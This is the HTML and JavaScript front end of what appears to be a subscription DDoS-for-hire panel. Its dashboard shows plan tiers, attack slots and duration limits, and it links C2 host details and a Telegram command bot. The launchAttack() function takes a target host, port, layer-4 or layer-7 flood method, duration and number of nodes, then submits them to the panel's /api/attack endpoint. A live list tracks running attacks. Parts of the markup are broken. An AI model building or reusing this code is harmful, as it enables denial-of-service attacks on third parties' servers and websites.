    <div class="dashboard-wrapper">
        <!-- Sidebar Navigation injected by sidebar.js?v=1.1 -->

        <!-- Main Content Area -->
        <main class="main-content">
            <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px;">
                <div>
                    <h1 class="glitch neon-stroke" data-text="COMMAND CENTER" style="font-size: 2.5rem; margin: 0;">
                        COMMAND CENTER

                    <p

                        Synchronized with Global

                </div>
                <div class="header-right-actions">

            <!-- Stats Grid -->
            <div class="stats-grid">

                    <div class="stat-info">
                        <h4>CLEARANCE LEVEL</h4>
                        <p id="dispPlan" class="online" style="text-shadow: 0 0 10px var(--neon-green);">-</p>
                        <div id="accessBadgesBox" style="margin-top: 8px; font-size: 0.75rem; letter-spacing: 0.5px;">
                        </div>
                        <div id="c2ConnectionBox"></div>
                    </div>
                </div>
                <div class="stat-card cyber-border pulse-glow" style="color: var(--neon-blue);">
                    <div class="stat-info">
                        <h4>SLOTS USAGE</h4>

                    </div>
                </div>
                <div class="stat-card cyber-border pulse-glow" style="color: var(--neon-purple);">
                    <div class="stat-info">
                        <h4>MAX DURATION</h4>
                        <p id="dispMax" style="text-shadow: 0 0 10px var(--neon-purple);">-</p>
                    </div>
                </div>
                <div class="stat-card cyber-border pulse-glow" style="color: #ffd700;">
                    <div class="stat-info">
                        <h4>EXPIRATION</h4>
                        <p id="dispExpire" style="font-size: 1rem; text-shadow: 0 0 10px rgba(251, 255, 0, 0.3);">-</p>
                    </div>
                </div>
            </div>

            <div class="control-panel">
                <!-- Attack Form -->
                <div class="card cyber-border" style="border-color: rgba(0, 255, 157, 0.3);">
                    <div style="display: flex; align-items: center; margin-bottom: 30px;">
                        <h3 style="margin: 0; color: var(--neon-green); text-shadow: 0 0 15px var(--neon-green);">⟨

                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">

                                (SEC)</label>
                            <input type="number" id="time" value="60" min="10">
                        </div>

                    <div style="margin-top: 20px; text-align: center;">

                            SETTINGS</button>

                <!-- Active Operations -->
                <div class="card" style="border-color: rgba(157, 0, 255, 0.2);">
                    <div
                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
                        <h3 style="margin: 0; color: var(--neon-purple);">LIVE OPERATIONS</h3>
                        <span id="activeCount"
                            style="background: rgba(157, 0, 255, 0.1); color: var(--neon-purple); padding: 5px 12px; border-radius: 50px; font-size: 0.75rem; font-weight: bold;">0
                            ACTIVE</span>
                    </div>

                    <div id="activeAttacks" style="max-height: 500px; overflow-y: auto;">
                        <div style="text-align: center; padding: 40px 0; color: var(--text-muted); font-size: 0.9rem;">

    <script src="assets/js/sidebar.js?v=1.1"></script>
    <script src="assets/js/header.js?v=1.1"></script>
    <script>
        const user = localStorage.getItem('user');
        const token = localStorage.getItem('token');
        if (!token) location.href = '/login';

        function logout() {
            localStorage.removeItem('token');
            localStorage.removeItem('user');
            location.href = '/login';
        }

        // HUD notifications are now handled globally via header.js
        let sysSettings = {};
        let sysPlans = {};

        async function loadSysData() {
            try {
                const sRes = await fetch('/api/public/settings');
                sysSettings = await sRes.json();
                const pRes = await fetch('/api/public/plans');
                sysPlans = await pRes.json();
            } catch (e) {
                console.warn(e);
            }
        }

        async function loadUserInfo() {
            if (Object.keys(sysSettings).length === 0) await loadSysData();
            const res = await fetch('/api/user/info', {
                headers: { 'Authorization': 'Bearer ' + token }
            });
            const data = await res.json();
            if (data.username) {
                const planSpan = document.getElementById('dispPlan');
                const planClass = 'plan-' + data.plan.toLowerCase().replace(' ', '-');
                document.getElementById('dispUser').innerText = data.username;
                planSpan.innerText = data.plan;
                planSpan.className = planClass; // Appy class for color
                planSpan.style.color = ''; // Clear forced color

                document.getElementById('dispMax').innerText = data.maxTime + 's';
                document.getElementById('dispConc').innerText = `${data.slotsUsed} / ${data.slots}`;
                document.getElementById('dispExpire').innerText = data.expiration;

                const userPlanConf = sysPlans[data.plan] || sysPlans['Free'] || {};

                // Render access badges
                const badgesBox = document.getElementById('accessBadgesBox');
                if (badgesBox) {
                    const apiB = userPlanConf.api_access ? '✅' : '❌';
                    const cncB = userPlanConf.cnc_access ? '✅' : '❌';
                    const botB = userPlanConf.tele_bot ? '✅' : '❌';
                    badgesBox.innerHTML = `
                        <span style="color:${userPlanConf.api_access ? 'var(--neon-green)' : '#555'}; margin-right:10px;">${apiB} API</span>
                        <span style="color:${userPlanConf.cnc_access ? 'var(--neon-purple)' : '#555'}; margin-right:10px;">${cncB} CNC</span>
                        <span style="color:${userPlanConf.tele_bot ? 'var(--neon-blue)' : '#555'};">${botB} BOT</span>
                    `;
                }

                // Render C2 Connection Details
                const c2Box = document.getElementById('c2ConnectionBox');
                if (c2Box) {
                    if (userPlanConf.cnc_access) {
                        c2Box.innerHTML = `
                            <div style="font-size: 0.8rem; color: var(--neon-purple); margin-top: 15px; font-family: 'JetBrains Mono', monospace; border-top: 1px dashed rgba(157,0,255,0.3); padding-top: 10px;">
                                <div style="margin-bottom: 5px;"><strong style="color: #fff;">[C2] HOST:</strong> ${sysSettings.cncHost || 'TBA'}</div>
                                <div style="margin-bottom: 5px;"><strong style="color: #fff;">[C2] PORT:</strong> ${sysSettings.cncPort || 'TBA'}</div>
                                <div style="color: #888; font-size: 0.7rem; line-height: 1.4;">Use web credentials to connect via terminal.</div>
                            </div>
                        `;
                    } else {
                        c2Box.innerHTML = `
                            <div style="font-size: 0.7rem; color: #ff5f56; margin-top: 15px; border-top: 1px dashed rgba(255,95,86,0.3); padding-top: 10px; line-height: 1.4;">
                                ⟨ C2 TERMINAL ACCESS RESTRICTED ⟩ <br>Upgrade plan to unlock infrastructure.
                            </div>
                        `;
                    }
                }

                const tgField = document.getElementById('telegramIdField');
                if (tgField) {
                    const serverTg = data.telegramId || "";
                    const lastSync = tgField.getAttribute('data-last-sync');
                    // Only update if not focused AND (field is empty OR value matches what we last synced)
                    if (document.activeElement !== tgField) {
                        if (tgField.value === "" || tgField.value === lastSync) {
                            if (tgField.value !== serverTg) {
                                tgField.value = serverTg;
                                tgField.setAttribute('data-last-sync', serverTg);
                            }
                        }
                    }
                }

                // Sync vpsCount max with plan limits
                const vpsInput = document.getElementById('vpsCount');
                if (vpsInput) {
                    vpsInput.max = data.concurrents;
                    const serverVps = data.concurrents;
                    const lastSyncVps = vpsInput.getAttribute('data-last-sync');

                    if (document.activeElement !== vpsInput) {
                        // Only clip or update if it matches last sync or is out of bounds
                        if (vpsInput.value === "" || vpsInput.value === lastSyncVps || parseInt(vpsInput.value) > data.concurrents) {
                            const targetVal = Math.min(parseInt(vpsInput.value) || serverVps, serverVps);
                            if (vpsInput.value != targetVal || lastSyncVps != serverVps) {
                                vpsInput.value = targetVal;
                                vpsInput.setAttribute('data-last-sync', targetVal);
                            }
                        }
                    }
                }

            } else {
                localStorage.removeItem('token');
                localStorage.removeItem('user');
                location.href = '/login';
            }
        }
        loadUserInfo();

        async function loadActiveAttacks() {
            const res = await fetch('/api/attacks/active', {
                headers: { 'Authorization': 'Bearer ' + token }
            });
            const attacks = await res.json();
            const container = document.getElementById('activeAttacks');
            document.getElementById('activeCount').innerText = `${attacks.length} ACTIVE`;
            if (attacks.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px 0; color: var(--text-muted); font-size: 0.9rem;">Ready for engagement.</div>';
                return;
            }
            container.innerHTML = '';
            attacks.forEach(a => {
                const div = document.createElement('div');
                div.className = 'attack-item';
                div.style.background = "rgba(255, 255, 255, 0.02)";
                div.style.margin = "10px 0";
                div.style.padding = "15px";
                div.style.borderRadius = "10px";
                div.style.border = "1px solid rgba(255, 255, 255, 0.05)";
                div.style.width = "100%";
                div.style.boxSizing = "border-box";
                div.innerHTML = `
                    <div style="display:flex; justify-content:space-between; align-items: center; margin-bottom: 12px;">
                        <span style="font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-right: 10px; color: #fff;">${a.host}</span>
                        <span style="font-family: 'JetBrains Mono', monospace; font-weight: bold; color: var(--neon-purple); font-size: 1rem;">${a.timeLeft}s</span>
                    </div>
                    <div style="height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-bottom: 12px; overflow: hidden;">
                        <div style="width: ${(a.timeLeft / a.time) * 100}%; height: 100%; background: linear-gradient(90deg, var(--neon-purple), var(--neon-blue)); transition: width 1s linear;"></div>
                    </div>
                    <div style="display: flex; justify-content: space-between; font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">
                        <span>${a.method}</span>
                        <span>Nodes: ${a.serverNames || 'Processing...'}</span>
                    </div>
                `;
                container.appendChild(div);
            });
        }
        setInterval(() => {
            loadActiveAttacks();
            loadUserInfo();
        }, 1000);
        loadActiveAttacks();

        async function launchAttack() {
            let host = document.getElementById('host').value.trim();
            const port = parseInt(document.getElementById('port').value);
            const method = document.getElementById('method').value;
            const time = parseInt(document.getElementById('time').value);
            const vpsCount = parseInt(document.getElementById('vpsCount').value) || 1;

            const btn = document.querySelector('button[onclick="launchAttack()"]');

            // Basic presence check
            if (!host || isNaN(port) || isNaN(time) || isNaN(vpsCount)) {
                return showStatus("Please fill in all fields!", "error");
            }

            // VPS Count validation
            const maxConc = parseInt(document.getElementById('vpsCount').max) || 1;
            if (vpsCount < 1) {
                return showStatus("Parallel Nodes must be at least 1!", "error");
            }
            if (vpsCount > maxConc) {
                return showStatus(`Your plan only allows up to ${maxConc} Nodes!`, "error");
            }

            // Time validation
            if (time < 10) {
                return showStatus("Thời gian tối thiểu là 10 giây!", "error");
            }

            // Port validation
            if (port < 1 || port > 65535) {
                return showStatus("Cổng (Port) phải từ 1 đến 65535!", "error");
            }

            // Protocol & Target validation
            const isL7 = !!window.isL7Method[method];
            const urlRegex = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;
            const domainRegex = /^[a-zA-Z0-9.-]+$/;

            if (isL7) {
                if (!host.startsWith('http://') && !host.startsWith('https://')) {
                    host = 'https://' + host;
                    document.getElementById('host').value = host;
                }
                if (!urlRegex.test(host)) {
                    return showStatus("Layer 7 yêu cầu định dạng URL hợp lệ (http/https)!", "error");
                }
            } else {
                // Layer 4
                if (host.includes('://')) {
                    return showStatus("Layer 4 không cần http/https! Vui lòng chỉ nhập IP hoặc Hostname.", "error");
                }
                if (!domainRegex.test(host)) {
                    return showStatus("Định dạng IP hoặc Hostname không hợp lệ!", "error");
                }
            }

            // UI Feedback
            btn.classList.add('loading');
            btn.innerText = 'INITIATING...';
            showStatus(`Initiating engagement on ${host}...`, "info");

            try {
                const res = await fetch(`/api/attack?host=${host}&port=${port}&method=${method}&time=${time}&conc=${vpsCount}`, {
                    headers: { 'Authorization': 'Bearer ' + token }
                });

                if (!res.ok) {
                    const errorText = await res.text();
                    btn.classList.remove('loading');
                    btn.innerText = 'INITIATE BURST';
                    try {
                        const errJson = JSON.parse(errorText);
                        return showStatus("Lỗi: " + (errJson.message || res.statusText), "error");
                    } catch (e) {
                        return showStatus("Lỗi Hệ thống (" + res.status + ")", "error");
                    }
                }

                const data = await res.json();

                btn.classList.remove('loading');
                btn.innerText = 'INITIATE BURST';

                if (data.error || !data.success) {
                    showStatus(data.message, "error");
                } else {
                    showStatus(`Payload deployed successfully!`, "success");
                    loadActiveAttacks();
                }
            } catch (err) {
                console.error(err);
                btn.classList.remove('loading');
                btn.innerText = 'INITIATE BURST';
                showStatus("Không thể kết nối tới Server API!", "error");
            }
        }

        async function loadMethods() {
            window.isL7Method = {};
            const res = await fetch('/api/methods');
            const data = await res.json();
            const select = document.getElementById('method');
            select.innerHTML = '';

            for (let groupKey in data) {
                const group = data[groupKey];

                // Dynamic label resolution from methods.json keys
                const label = groupKey.toUpperCase();

                const optGroup = document.createElement('optgroup');
                optGroup.label = label;

                let hasValid = false;
                for (let m in group) {
                    const conf = group[m];
                    window.isL7Method[m] = (conf.Type === 'layer7' || groupKey.toLowerCase().includes('layer 7'));
                    if (conf.status === 'offline') continue;

                    const opt = document.createElement('option');
                    opt.value = m.toUpperCase();
                    opt.innerText = m.toUpperCase();
                    optGroup.appendChild(opt);
                    hasValid = true;
                }
                if (hasValid) select.appendChild(optGroup);
            }
        }
        loadMethods();

        function openProfileModal() {
            document.getElementById('profileModalOverlay').style.display = 'block';
        }

        function closeProfileModal() {
            document.getElementById('profileModalOverlay').style.display = 'none';
        }

        async function submitUpdateProfile() {
            const curPass = document.getElementById('curPass').value;
            const newPass = document.getElementById('newPass').value;
            const confirmPass = document.getElementById('confirmPass').value;
            const telegramId = document.getElementById('telegramIdField').value;

            if (newPass && newPass !== confirmPass) return showStatus("New passwords do not match!", "error");
            if (newPass && newPass.length < 6) return showStatus("New password must be at least 6 characters!", "error");

            const btn = document.querySelector('button[onclick="submitUpdateProfile()"]');
            btn.classList.add('loading');
            btn.innerText = 'UPDATING...';

            try {
                const res = await fetch('/api/user/profile/update', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer ' + token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ currentPassword: curPass, newPassword: newPass, telegramId })
                });
                const data = await res.json();

                btn.classList.remove('loading');
                btn.innerText = 'UPDATE PROFILE';

                if (!data.error) {
                    showStatus("Profile updated successfully!", "success");
                    if (newPass) {
                        setTimeout(() => logout(), 2000);
                    } else {
                        closeProfileModal();
                        loadUserInfo();
                    }
                } else {
                    showStatus(data.message || "Lỗi khi cập nhật!", "error");
                }
            } catch (err) {
                console.error(err);
                btn.classList.remove('loading');
                btn.innerText = 'UPDATE PROFILE';
                showStatus("Không thể kết nối tới server!", "error");
            }
        }
    </script>
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script>
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 100, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": ["#00ff9d", "#9d00ff", "#00d4ff", "#ff00ea"] },
                "shape": { "type": "circle" },
                "opacity": { "value": 0.5, "random": true, "anim": { "enable": true, "speed": 1, "opacity_min": 0.1, "sync": false } },
                "size": { "value": 3, "random": true, "anim": { "enable": true, "speed": 2, "size_min": 0.1, "sync": false } },
                "line_linked": { "enable": true, "distance": 150, "color": "#9d00ff", "opacity": 0.2, "width": 1 },
                "move": { "enable": true, "speed": 2, "direction": "none", "random": true, "out_mode": "out" }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" } },
                "modes": { "grab": { "distance": 140, "line_linked": { "opacity": 1 } }, "push": { "particles_nb": 4 } }
            },
            "retina_detect": true
        });
    </script>
    <!-- Profile & Security Modal -->
    <div id="profileModalOverlay" class="modal-overlay">
        <div class="modal" style="background: #0a0a0a !important; border-width: 2px !important; max-width: 500px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;">
                <h3 style="margin:0; color:var(--neon-purple); letter-spacing:1px; font-size: 1rem;">IDENTITY &
                    SECURITY HUB</h3>
                <span onclick="closeProfileModal()"
                    style="cursor:pointer; color:#888; font-size:1.5rem; line-height:1;">&times;</span>
            </div>

            <div class="input-group">
                <label style="color: var(--neon-blue);">TELEGRAM ID LINK</label>
                <input type="number" id="telegramIdField" placeholder="Enter your Chat ID">
                <small style="color: var(--text-muted); font-size: 0.7rem; margin-top: 5px; display: block;">Link your
                    ID to use the Command Bot.</small>
            </div>

            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.05); margin: 20px 0;">

            <div class="input-group">
                <label>CURRENT PASSWORD (REQUIRED FOR CHANGES)</label>
                <input type="password" id="curPass" placeholder="••••••••">
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
